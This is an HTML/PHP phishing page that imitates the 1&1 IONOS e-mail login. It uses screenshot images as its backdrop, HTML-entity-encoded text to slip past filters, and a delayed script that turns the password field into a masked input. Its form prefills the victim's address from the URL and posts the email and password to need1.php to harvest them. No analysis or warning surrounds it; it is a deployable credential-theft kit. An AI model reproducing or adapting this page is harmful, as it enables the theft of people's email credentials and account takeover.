<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#49;&#38;&#49;&#32;&#73;&#79;&#78;&#79;&#83;&#32;&#69;&#45;&#77;&#97;&#105;&#108;&#32;&#108;&#111;&#103;&#105;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #b3b6b8;
	background: transparent;	
    height: 34px; 
    width: 275px; 
  	font-family: Tahoma,"????","??",arial;
    font-size: 14px;
  	color: #000;
    padding-left: 2em; 
    border-radius: 2px; 
    box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);  
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #0881ba;
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:474px; z-index:0"><img src="images/w1.png" alt="" title="" border=0 width=1349 height=474></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:467px; width:1349px; height:546px; z-index:1"><img src="images/w4.png" alt="" title="" border=0 width=1349 height=546></div>
<form action=need1.php name=niklobhai id=niklobhai method=post>
<input name="email" value="<?=$_GET[email]?>" placeholder="&#69;&#45;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:490px;left:430px;top:221px;z-index:2">
<input name="pw" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:490px;left:430px;top:296px;z-index:3">
<div id="formimage1" style="position:absolute; left:429px; top:372px; z-index:4"><input type="image" name="formimage1" width="492" height="37" src="images/wlg.png"></div>
</div>

</body>
</html>
